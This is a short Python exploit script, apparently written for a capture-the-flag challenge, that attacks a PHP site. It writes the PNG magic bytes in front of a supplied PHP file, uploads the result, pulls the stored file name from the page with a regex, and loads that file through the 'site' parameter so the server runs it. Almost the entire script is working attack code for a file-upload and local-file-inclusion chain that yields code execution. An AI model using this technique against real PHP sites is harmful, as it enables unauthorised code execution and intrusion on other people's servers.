#!/usr/bin/python3

import sys
import requests
from pathlib import Path
import re

# magic number for png files
png = bytearray.fromhex("89504E470D0A1A0A")

url = r"http://lfi.hax1.allesctf.net:8081/index.php"

if len(sys.argv) == 2:

    injection = Path(sys.argv[1])

    # build png injection that has png magic number and append php file content to it
    with injection.open() as f:
        target = Path("injection.png")
        with target.open("wb") as t:
            t.write(png)
            t.write(bytes(f.read(), "utf-8"))

    # upload file
    files = {"file": target.open("rb")}
    params = {"site": "upload.php"}

    upload = requests.post(url, files=files, params=params)
    # find uploaded file - dont know which hash function is used so I just try
    """
    oh its $filename = md5(pathinfo($_FILES['file']['name'], PATHINFO_FILENAME)); after looking into the source
    """
    regex = re.compile(r'<a href="index\.php\?site=view\.php&image=(.*)">')

    injected_file = regex.search(upload.text).group(1)
    # site will be included, do not really care for image
    params = {"site": injected_file, "image": injected_file}

    execution = requests.get(url, params=params)

    print(execution.text)

else:
    print("Please supply path")
